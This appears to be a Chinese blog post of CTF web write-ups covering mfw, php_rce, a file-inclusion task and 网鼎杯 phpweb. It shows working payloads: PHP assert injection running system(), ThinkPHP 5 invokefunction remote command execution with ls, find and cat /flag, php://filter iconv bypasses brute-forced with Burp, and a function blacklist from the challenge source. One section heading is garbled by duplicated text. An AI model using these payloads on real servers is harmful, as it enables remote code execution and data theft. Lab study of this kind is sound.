{"title":"Writeup_2022 NewstarCTF_Week1(Web部分)","slug":"攻防世界做题记录3","date":"2023-09-11T12:08:50.000Z","updated":"2023-09-30T09:08:23.222Z","comments":true,"path":"api/articles/攻防世界做题记录3.json","photos":[],"link":"","excerpt":"做题记录","covers":["https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902162558377-1989063608.png","https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902182614238-883024157.png","https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902193727121-429631782.png","https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903180701730-2096930147.png","https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904102026887-1995512140.png","https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904110040442-185642157.png","https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904121505457-2065669123.png"],"content":"<p>做题记录</p>\n<span id=\"more\"></span>\n\n<hr>\n<h2 id=\"mfw\"><a href=\"#mfw\" class=\"headerlink\" title=\"mfw\"></a><strong>mfw</strong></h2><p>进入环境:<br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902162558377-1989063608.png\" alt=\"image\"><br>点下上面的链接看看结果About：<br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902162737388-103196317.png\" alt=\"image\"><br>里面有个Git,想到了Git泄露,直接看下.git文件有没有：<br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902163006440-1817053939.png\" alt=\"image\"><br>上GitHack：<br><code>python GitHack.py http://61.147.171.105:55455/.git/</code><br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902165858467-546251962.png\" alt=\"image\"><br>访问一下，看有没有啥好东西：<br>flag.php里啥也没有，可惜：<br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902165941652-2027700756.png\" alt=\"image\"><br>看下index.php,里面有不少好东西，把有用的php部分拿出来：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">if (isset($_GET[&#x27;page&#x27;])) &#123;</span><br><span class=\"line\">\t$page = $_GET[&#x27;page&#x27;];</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">\t$page = &quot;home&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$file = &quot;templates/&quot; . $page . &quot;.php&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// I heard &#x27;..&#x27; is dangerous!</span><br><span class=\"line\">assert(&quot;strpos(&#x27;$file&#x27;, &#x27;..&#x27;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">// TODO: Make this look nice</span><br><span class=\"line\">assert(&quot;file_exists(&#x27;$file&#x27;)&quot;) or die(&quot;That file doesn&#x27;t exist!&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">require_once $file;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>首先GET方式传page，不给page赋值的话自动等于home(就是我们进去看到的首页)，然后进行一个拼接：templates&#x2F;$page.php，把这东西给$file。assert这东西叫“断言检查”，意思是如果里面的条件是真，就会接着执行后面的函数require_once，这东西有点点像include包含，至于直接包含某个文件，不用伪协议啥的我一直把它理解成执行该文件，哈哈。<br>接下来的思路就是构造page让他执行一些命令比如’ls’ ‘cat’啥的。<br>接下来的payload参考了这位师傅的文章，感谢！：<br><code>https://blog.csdn.net/m0_62063669/article/details/125427751?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169364331616800186574360%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169364331616800186574360&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-125427751-null-null.142^v93^koosearch_v1&amp;utm_term=mfw&amp;spm=1018.2226.3001.4187</code><br>payloaad:<br><code>index.php/?page=flag&#39;,&#39;abc&#39;) === false and system(&quot;cat templates/flag.php&quot;) and strops(&#39;flag</code><br>解释下为什么要给page赋这么一个值，先看这个page让file成了个啥东西：<br><code>file = template/flag&#39;,&#39;abc&#39;) === false and system(&quot;cat templates/flag.php&quot;) and strops(&#39;flag.php</code><br>带到断言函数中：<br><code>assert(&quot;strpos(&#39;template/flag&#39;,&#39;abc&#39;) === false and system(&quot;cat templates/flag.php&quot;) and strops(&#39;flag.php&#39;, &#39;..&#39;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</code></p>\n<p>strpos函数是看参数里有没有要检测的值，有的话返回第一次出现的位置，没有就返回false。明显 ‘template&#x2F;flag’这里面没abc，第一个assert为真；第二个执行 cat templates&#x2F;flag.php ，这没啥好说的，就是去拿我们要的flag，不过注意cat后的文件路径。我们当前在index.php下，index.php和templates同目录，flag.php又在templates下。所以相对路径就是<code>templates/flag.php</code>。最后一个断言是找flag.php中有没有俩点，没有返回false。因为是两个and连接，三个条件都为真即为真。然后直接require($file)，执行命令。<br>flag藏在源码里：<br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902182614238-883024157.png\" alt=\"image\"></p>\n<h2 id=\"php-rce\"><a href=\"#php-rce\" class=\"headerlink\" title=\"php_rce\"></a><strong>php_rce</strong></h2><p>进入环境：<br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902193727121-429631782.png\" alt=\"image\"><br>Github搜下有关这个ThinkPHPV5的相关漏洞，发现有一大堆远程命令执行的POC：<br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200111760-1487399677.png\" alt=\"image\"><br>找个长的试试：<br><code>s=index/%5Cthink%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=phpinfo&amp;vars%5B1%5D%5B%5D=1</code><br>执行了phpinfo()这个命令<br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200144506-2129745043.png\" alt=\"image\"><br>ls看下当前目录下的文件：<br><code>?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</code><br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200315231-1913861343.png\" alt=\"image\"><br>没有和flag有关的东西，等会用find找一下，不过这里有个和爬虫有关的robots.txt，让我看看你：<br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200424907-1518032191.png\" alt=\"image\"><br>可惜啥也没有，find命令找下和flag有关的东西：<br><code>?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find /%20 -name &quot;flag*&quot;</code><br>find是全磁盘查找所以可能会比较慢：<br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200658223-1816441800.png\" alt=\"image\"><br>草了，还是看看根目录下都啥东西吧：<br><code>?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls /</code><br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200800369-192377013.png\" alt=\"image\"><br>有个flag: ls &#x2F;flag没啥有价值的东西，直接 cat &#x2F;flag读一下：<br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902201445887-2027647501.png\" alt=\"image\"></p>\n<h2 id=\"题目名称-文件包含\"><a href=\"#题目名称-文件包含\" class=\"headerlink\" title=\"题目名称-文件包含\"></a><strong>题目名称-文件包含</strong></h2><h2 id=\"进入环境，朴实无华的一小段php，直接filter伪协议读flag-php源码：回显了dont-hack！估计check-php起作用然后触发什么关键词了。。这时候想到之前做过的一道题：用了convert-iconv-UTF-8-UCS-4BE-resource-check-php这种类型的过滤器，那就试试这个：-filename-php-filter-convert-iconv-UTF-8-UCS-4BE-resource-check-php过滤器对了但是用法不对，那可能是input-encoding和output-encoding不对。。需要一个一个找。。但这玩意可用的编码实在太多：直接去翻了wp。。感谢这位师傅：https-blog-csdn-net-gsumall04-article-details-131807065-ops-request-misc-257B-2522request-255Fid-2522-253A-2522169373375216800222871982-2522-252C-2522scm-2522-253A-252220140713-130102334-2522-257D-request-id-169373375216800222871982-biz-id-0-utm-medium-distribute-pc-search-result-none-task-blog-2-all-top-positive-default-1-131807065-null-null-142-v93-koosearch-v1-utm-term-E9-A2-98-E7-9B-AE-E5-90-8D-E7-A7-B0-E6-96-87-E4-BB-B6-E5-8C-85-E5-90-AB-spm-1018-2226-3001-4187我是懒狗就不一个一个加了。。也不知道有没有编码的字典，能方便不少。我放了4种熟悉下步骤：burpsuite的intruder模块爆一下，选择集束炸弹模式：根据长度排列一下：拿到flag：最后说下为什么要去读flag-php而不是别的：一是很多flag都在这个文件里，二是直接访问flag-php时它并没给我们报错-网鼎杯-2020-朱雀组-phpweb\"><a href=\"#进入环境，朴实无华的一小段php，直接filter伪协议读flag-php源码：回显了dont-hack！估计check-php起作用然后触发什么关键词了。。这时候想到之前做过的一道题：用了convert-iconv-UTF-8-UCS-4BE-resource-check-php这种类型的过滤器，那就试试这个：-filename-php-filter-convert-iconv-UTF-8-UCS-4BE-resource-check-php过滤器对了但是用法不对，那可能是input-encoding和output-encoding不对。。需要一个一个找。。但这玩意可用的编码实在太多：直接去翻了wp。。感谢这位师傅：https-blog-csdn-net-gsumall04-article-details-131807065-ops-request-misc-257B-2522request-255Fid-2522-253A-2522169373375216800222871982-2522-252C-2522scm-2522-253A-252220140713-130102334-2522-257D-request-id-169373375216800222871982-biz-id-0-utm-medium-distribute-pc-search-result-none-task-blog-2-all-top-positive-default-1-131807065-null-null-142-v93-koosearch-v1-utm-term-E9-A2-98-E7-9B-AE-E5-90-8D-E7-A7-B0-E6-96-87-E4-BB-B6-E5-8C-85-E5-90-AB-spm-1018-2226-3001-4187我是懒狗就不一个一个加了。。也不知道有没有编码的字典，能方便不少。我放了4种熟悉下步骤：burpsuite的intruder模块爆一下，选择集束炸弹模式：根据长度排列一下：拿到flag：最后说下为什么要去读flag-php而不是别的：一是很多flag都在这个文件里，二是直接访问flag-php时它并没给我们报错-网鼎杯-2020-朱雀组-phpweb\" class=\"headerlink\" title=\"进入环境，朴实无华的一小段php，直接filter伪协议读flag.php源码：回显了dont hack！估计check.php起作用然后触发什么关键词了。。这时候想到之前做过的一道题：用了convert.iconv.UTF-8*.UCS-4BE.resource=./check.php这种类型的过滤器，那就试试这个：?filename=php://filter/convert.iconv.UTF-8*.UCS-4BE.resource=./check.php过滤器对了但是用法不对，那可能是input-encoding和output-encoding不对。。需要一个一个找。。但这玩意可用的编码实在太多：直接去翻了wp。。感谢这位师傅：https://blog.csdn.net/gsumall04/article/details/131807065?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169373375216800222871982%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169373375216800222871982&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-131807065-null-null.142^v93^koosearch_v1&amp;utm_term=%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&amp;spm=1018.2226.3001.4187我是懒狗就不一个一个加了。。也不知道有没有编码的字典，能方便不少。我放了4种熟悉下步骤：burpsuite的intruder模块爆一下，选择集束炸弹模式：根据长度排列一下：拿到flag：最后说下为什么要去读flag.php而不是别的：一是很多flag都在这个文件里，二是直接访问flag.php时它并没给我们报错:[网鼎杯 2020 朱雀组]phpweb\"></a>进入环境，朴实无华的一小段php，直接filter伪协议读flag.php源码：<br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903180701730-2096930147.png\" alt=\"image\"><br>回显了dont hack！估计check.php起作用然后触发什么关键词了。。这时候想到之前做过的一道题：用了<br><code>convert.iconv.UTF-8*.UCS-4BE.resource=./check.php</code><br>这种类型的过滤器，那就试试这个：<br><code>?filename=php://filter/convert.iconv.UTF-8*.UCS-4BE.resource=./check.php</code><br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903180953978-745219457.png\" alt=\"image\"><br>过滤器对了但是用法不对，那可能是input-encoding和output-encoding不对。。需要一个一个找。。但这玩意可用的编码实在太多：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">UCS-4*</span><br><span class=\"line\">    UCS-4BE</span><br><span class=\"line\">    UCS-4LE*</span><br><span class=\"line\">    UCS-2</span><br><span class=\"line\">    UCS-2BE</span><br><span class=\"line\">    UCS-2LE</span><br><span class=\"line\">    UTF-32*</span><br><span class=\"line\">    UTF-32BE*</span><br><span class=\"line\">    UTF-32LE*</span><br><span class=\"line\">    UTF-16*</span><br><span class=\"line\">    UTF-16BE*</span><br><span class=\"line\">    UTF-16LE*</span><br><span class=\"line\">    UTF-7</span><br><span class=\"line\">    UTF7-IMAP</span><br><span class=\"line\">    UTF-8*</span><br><span class=\"line\">    ASCII*</span><br><span class=\"line\">    EUC-JP*</span><br><span class=\"line\">    SJIS*</span><br><span class=\"line\">    eucJP-win*</span><br><span class=\"line\">    SJIS-win*</span><br><span class=\"line\">    ISO-2022-JP</span><br><span class=\"line\">    ISO-2022-JP-MS</span><br><span class=\"line\">    CP932</span><br><span class=\"line\">    CP51932</span><br><span class=\"line\">    SJIS-mac（别名：MacJapanese）</span><br><span class=\"line\">    SJIS-Mobile#DOCOMO（别名：SJIS-DOCOMO）</span><br><span class=\"line\">    SJIS-Mobile#KDDI（别名：SJIS-KDDI）</span><br><span class=\"line\">    SJIS-Mobile#SOFTBANK（别名：SJIS-SOFTBANK）</span><br><span class=\"line\">    UTF-8-Mobile#DOCOMO（别名：UTF-8-DOCOMO）</span><br><span class=\"line\">    UTF-8-Mobile#KDDI-A</span><br><span class=\"line\">    UTF-8-Mobile#KDDI-B（别名：UTF-8-KDDI）</span><br><span class=\"line\">    UTF-8-Mobile#SOFTBANK（别名：UTF-8-SOFTBANK）</span><br><span class=\"line\">    ISO-2022-JP-MOBILE#KDDI（别名：ISO-2022-JP-KDDI）</span><br><span class=\"line\">    JIS</span><br><span class=\"line\">    JIS-ms</span><br><span class=\"line\">    CP50220</span><br><span class=\"line\">    CP50220raw</span><br><span class=\"line\">    CP50221</span><br><span class=\"line\">    CP50222</span><br><span class=\"line\">    ISO-8859-1*</span><br><span class=\"line\">    ISO-8859-2*</span><br><span class=\"line\">    ISO-8859-3*</span><br><span class=\"line\">    ISO-8859-4*</span><br><span class=\"line\">    ISO-8859-5*</span><br><span class=\"line\">    ISO-8859-6*</span><br><span class=\"line\">    ISO-8859-7*</span><br><span class=\"line\">    ISO-8859-8*</span><br><span class=\"line\">    ISO-8859-9*</span><br><span class=\"line\">    ISO-8859-10*</span><br><span class=\"line\">    ISO-8859-13*</span><br><span class=\"line\">    ISO-8859-14*</span><br><span class=\"line\">    ISO-8859-15*</span><br><span class=\"line\">    ISO-8859-16*</span><br><span class=\"line\">    byte2be</span><br><span class=\"line\">    byte2le</span><br><span class=\"line\">    byte4be</span><br><span class=\"line\">    byte4le</span><br><span class=\"line\">    BASE64</span><br><span class=\"line\">    HTML-ENTITIES（别名：HTML）</span><br><span class=\"line\">    7bit</span><br><span class=\"line\">    8bit</span><br><span class=\"line\">    EUC-CN*</span><br><span class=\"line\">    CP936</span><br><span class=\"line\">    GB18030</span><br><span class=\"line\">    HZ</span><br><span class=\"line\">    EUC-TW*</span><br><span class=\"line\">    CP950</span><br><span class=\"line\">    BIG-5*</span><br><span class=\"line\">    EUC-KR*</span><br><span class=\"line\">    UHC（别名：CP949）</span><br><span class=\"line\">    ISO-2022-KR</span><br><span class=\"line\">    Windows-1251（别名：CP1251）</span><br><span class=\"line\">    Windows-1252（别名：CP1252）</span><br><span class=\"line\">    CP866（别名：IBM866）</span><br><span class=\"line\">    KOI8-R*</span><br><span class=\"line\">    KOI8-U*</span><br><span class=\"line\">    ArmSCII-8（别名：ArmSCII8</span><br></pre></td></tr></table></figure><br>直接去翻了wp。。感谢这位师傅：<br><code>https://blog.csdn.net/gsumall04/article/details/131807065?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169373375216800222871982%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169373375216800222871982&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-131807065-null-null.142^v93^koosearch_v1&amp;utm_term=%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&amp;spm=1018.2226.3001.4187</code><br>我是懒狗就不一个一个加了。。也不知道有没有编码的字典，能方便不少。我放了4种熟悉下步骤：burpsuite的intruder模块爆一下，选择集束炸弹模式：<br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903191411125-1673822326.png\" alt=\"image\"><br>根据长度排列一下：<br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903191442857-1708949819.png\" alt=\"image\"><br>拿到flag：<br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903191453864-1253755233.png\" alt=\"image\"><br>最后说下为什么要去读flag.php而不是别的：一是很多flag都在这个文件里，二是直接访问flag.php时它并没给我们报错:<br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903192129048-1514343739.png\" alt=\"image\"><br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903192145289-1200878021.png\" alt=\"image\"><br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">1xx（信息性状态码）：表示请求已被接收，继续处理。</span><br><span class=\"line\">    100 Continue：服务器已接收到请求的初始部分，客户端应继续发送剩余部分。</span><br><span class=\"line\">    101 Switching Protocols：服务器已理解并接受客户端的请求，将切换到新的协议。</span><br><span class=\"line\"></span><br><span class=\"line\">2xx（成功状态码）：表示请求已成功被服务器接收、理解和处理。</span><br><span class=\"line\">    200 OK：请求成功，服务器返回请求的内容。</span><br><span class=\"line\">    201 Created：请求成功，服务器创建了新资源。</span><br><span class=\"line\">    204 No Content：请求成功，服务器处理成功，但没有返回任何内容。</span><br><span class=\"line\"></span><br><span class=\"line\">3xx（重定向状态码）：表示需要进一步操作以完成请求。</span><br><span class=\"line\">    301 Moved Permanently：请求的资源已永久移动到新位置。</span><br><span class=\"line\">    302 Found：请求的资源临时移动到新位置。</span><br><span class=\"line\">    304 Not Modified：资源未修改，客户端可以使用缓存的版本。</span><br><span class=\"line\"></span><br><span class=\"line\">4xx（客户端错误状态码）：表示客户端发送的请求有错误。</span><br><span class=\"line\">    400 Bad Request：请求无效，服务器无法理解。</span><br><span class=\"line\">    401 Unauthorized：请求要求身份验证。</span><br><span class=\"line\">    404 Not Found：请求的资源不存在。</span><br><span class=\"line\"></span><br><span class=\"line\">5xx（服务器错误状态码）：表示服务器在处理请求时发生错误。</span><br><span class=\"line\">    500 Internal Server Error：服务器遇到了意外错误。</span><br><span class=\"line\">    502 Bad Gateway：服务器作为网关或代理，从上游服务器接收到无效响应。</span><br><span class=\"line\">    503 Service Unavailable：服务器当前无法处理请求，通常由于过载或维护。</span><br></pre></td></tr></table></figure><br><strong>[网鼎杯 2020 朱雀组]phpweb</strong></h2><p>进入环境：<br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093450823-256892203.png\" alt=\"image\"><br>没啥特别的。。不过这页面没过几秒就会刷新一下，出现下面这种东西：<br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093541288-1989671347.png\" alt=\"image\"><br>他说某个和data有关的函数设置有问题?右键看下源码有啥东西：<br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093749742-1998449790.png\" alt=\"image\"><br>burpsuite抓下包看看：<br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093907037-1988636454.png\" alt=\"image\"><br>下面有个这个东西：<br><code>func=date&amp;p=Y-m-d+h%3Ai%3As+a</code><br>前面是个函数？后面是他的参数？看着像命令执行，改成system(‘ls’)看看效果：<br><code>func=system&amp;p=ls</code><br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904094304564-1249635122.png\" alt=\"image\"><br>回显了hacker。。估计是太直白了，system&#x2F;eval都会回显Hacker。include&#x2F;require函数读下index.php的源码？<br><code>func=include&amp;p=php://filter/read=convert.base64-encode/resource=index.php</code><br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904100428721-1887388885.png\" alt=\"image\"><br>提示call_user_func()函数找不到第一个参数include&#x2F;require或这是一个无效的函数名？怎么会找不到include()函数呢？问了下GPT发现call_back_func不是所有函数都能执行，它是<strong>调用一个回调函数或方法</strong>。而且并不是所有函数都是回调函数，判断一个函数能否回调可以用<code>is_callable</code>函数，比如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$callback = &#x27;include&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">if (is_callable($callback)) &#123;</span><br><span class=\"line\">    echo &#x27;可以回调&#x27;;</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    echo &#x27;不可回调&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//结果：不可回调</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>不得不说CHATGPT这东西确实好用，我问他call_back_func(include,php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php)为什么不行时他不光给了不可用的理由，还建议我用file_get_contents()函数去读文件：<br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904102026887-1995512140.png\" alt=\"image\"><br>差点把这东西忘了，既然它可以回调就file_get_contents(index.php)读下Index.php：<br><code>func=file_get_contents&amp;p=index.php</code><br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904102245157-1804309849.png\" alt=\"image\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">   $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);//黑名单，禁用了很多函数</span><br><span class=\"line\">   function gettime($func, $p) &#123;</span><br><span class=\"line\">       $result = call_user_func($func, $p); //调用call_user_func函数，注意该函数只能调用可以回调的函数</span><br><span class=\"line\">       $a= gettype($result); //$result是什么类型？</span><br><span class=\"line\">       if ($a == &quot;string&quot;) &#123; //如果是字符串</span><br><span class=\"line\">           return $result;</span><br><span class=\"line\">       &#125; else &#123;return &quot;&quot;;&#125; //如果是其它</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   class Test &#123;</span><br><span class=\"line\">       var $p = &quot;Y-m-d h:i:s a&quot;;//旧式的用于声明类属性（成员变量）的关键字，新版本的PHP多用 public等</span><br><span class=\"line\">       var $func = &quot;date&quot;;</span><br><span class=\"line\">       function __destruct() &#123;</span><br><span class=\"line\">           if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class=\"line\">               echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   $func = $_REQUEST[&quot;func&quot;];//获取通过 GET、POST 和 COOKIE 方法传递的参数</span><br><span class=\"line\">   $p = $_REQUEST[&quot;p&quot;];</span><br><span class=\"line\"></span><br><span class=\"line\">   if ($func != null) &#123;</span><br><span class=\"line\">       $func = strtolower($func);</span><br><span class=\"line\">       if (!in_array($func,$disable_fun)) &#123;</span><br><span class=\"line\">           echo gettime($func, $p);</span><br><span class=\"line\">       &#125;else &#123;</span><br><span class=\"line\">           die(&quot;Hacker...&quot;);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   